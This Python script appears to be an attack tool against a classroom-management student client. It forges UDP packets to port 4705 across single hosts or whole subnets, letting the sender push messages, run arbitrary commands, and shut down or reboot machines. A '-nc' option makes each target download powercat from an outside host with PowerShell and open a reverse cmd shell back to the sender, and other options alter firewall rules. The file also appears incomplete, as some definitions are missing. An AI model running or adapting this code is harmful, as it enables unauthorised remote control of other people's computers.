# 判断该字符串是否为数字
def judge_is_num(s):
    flag = True
    for n in s:
        if n not in '0123456789':
            flag = False
            break
    return flag


# 格式化要发送的消息
def format_b4_send(content):
    arr = []
    for ch in content:
        tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
        if int(tmp, 16) > 0xff:
            tmp = tmp[2:]
            high = int((tmp[0] + tmp[1]), 16)
            low = int((tmp[2] + tmp[3]), 16)
            arr.append(low)
            arr.append(high)
        else:
            high = 0
            low = int((tmp[2] + tmp[3]), 16)
            arr.append(low)
            arr.append(high)
    return arr


# 获取ip
def get_ip(ip):
    target_host = []
    if ip.find('.') == -1:
        print('\nYou enter a error IP.')
        print("Please enter the correct format of the IP again.")
        sys.exit(0)
    if ip.find('-') != -1 :
        ip_arr = ip.split('-')
        ip_arrs = ip_arr[0].split('.')
        if int(ip_arr[1]) >254:
            ip_arr[1] = '254'
        for i in range(int(ip_arrs[3]), int(ip_arr[1])+1):
            ip_arrs[3] = str(i)
            target_host.append('.'.join(ip_arrs))
    elif ip.find('/') == -1:
        target_host.append(ip)
    elif ip.find('/24') != -1:
        ip_arr = ip.split('/')
        ip_arrs = ip_arr[0].split('.')
        for i in range(1, 255):
            ip_arrs[3] = str(i)
            target_host.append('.'.join(ip_arrs))
    else:
        print('\nYou enter a error IP.')
        print("Please enter the correct format of the IP again.")
        sys.exit(0)
    return target_host


# 将要发送的消息打包成完整的指令
def pkg_sendlist(cmdtype, content):
    arrs = format_b4_send(content)
    if cmdtype == '-msg':
        index = 56
        result = basicCMD['-msg']
        for elem in arrs:
            result[index] = elem
            index += 1
    elif cmdtype == '-c':
        index = 100
        result = basicCMD['-c']
        for elem in arrs:
            result[index] = elem
            index += 1
    return result


# 发送
def send(config, send_list):
    if len(send_list) == 0:
        print(error_msg, aasr)
        sys.exit(0)
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target_host = get_ip(config['ip'])
    for times in range(config['l']):
        for i in target_host:
            for abc in send_list:
                payload = pack("%dB" % (len(abc)), *abc)
                client.sendto(payload, (i, config['port']))
        if config['l'] == 1:
            print("发送成功")        
        else:
            print("第%s次执行完毕" % str(times + 1))
            if times != config['l'] - 1:
                sleep(config['t'])


def creat_send_object(command):
    config = {
        'ip' : '',
        'port' : 4705,
        't' : 22,
        'l' : 1,
    }
    send_list = []

    # 获取ip
    if '-ip' in command:
        config['ip'] = command[command.index('-ip') + 1]

    # 获取端口
    if '-p' in command:
        if judge_is_num(command[command.index('-p') + 1]):
            config['port'] = int(command[command.index('-p') + 1])
    
    # 获取命令内容
    if '-msg' in command:
        send_list.append(pkg_sendlist('-msg', command[command.index('-msg') + 1]))

    if '-c' in command:
        send_list.append(pkg_sendlist('-c', command[command.index('-c') + 1]))

    if '-r' in command:
        send_list.append(basicCMD['-r'])

    if '-s' in command:
        send_list.append(basicCMD['-s'])

    if '-t' in command:
        if judge_is_num(command[command.index('-t') + 1]):
            config['t'] = int(command[command.index('-t') + 1])

    if '-l' in command:
        if judge_is_num(command[command.index('-l') + 1]):
            config['l'] = int(command[command.index('-l') + 1])

    if '-nc' in command:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p 39077 -e cmd".format(ip)
        send_list.append(pkg_sendlist('-c', cmd))

    return config, send_list


def single_command(command):
    if '-g' in command:
        try :
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            print("\nYour ip addres is:" + ip)

            tasklist = popen("tasklist|find \"Student\"").read()
            pattern = compile(r'[e]\s*\d{1,5}\s*[C]')
            pid = (pattern.search(tasklist).group()[1:-1]).strip()

            netstat = popen("netstat -ano |find \"{}\"".format(pid)).read()
            pattern = compile(r"%s:\d{1,5}\s*[*]{1}" % ip)
            netstat_pat =pattern.findall(netstat)

            ports= [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
            print("\nYour student client possible ports are:" + ','.join(ports))
        except:
            pass
        sys.exit(0)


    elif '-break' in command:
        popen('sc config MpsSvc start= auto')
        popen('net start MpsSvc')
        popen('netsh advfirewall set allprofiles state on')
        popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=block')
        sys.exit(0)

    elif '-continue' in command:
        popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow')
        sys.exit(0)


def run_from_cmd(command):
    try:
        single_command(command)
        config, send_list = creat_send_object(sys.argv)
        send(config, send_list)
        if '-nc' in command:
            system("powershell.exe IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p 39077")
    except Exception as e:
        print(error_msg, aasr)
        print("[-] %s" % e)


if __name__ == '__main__':
    run_from_cmd(sys.argv)
    

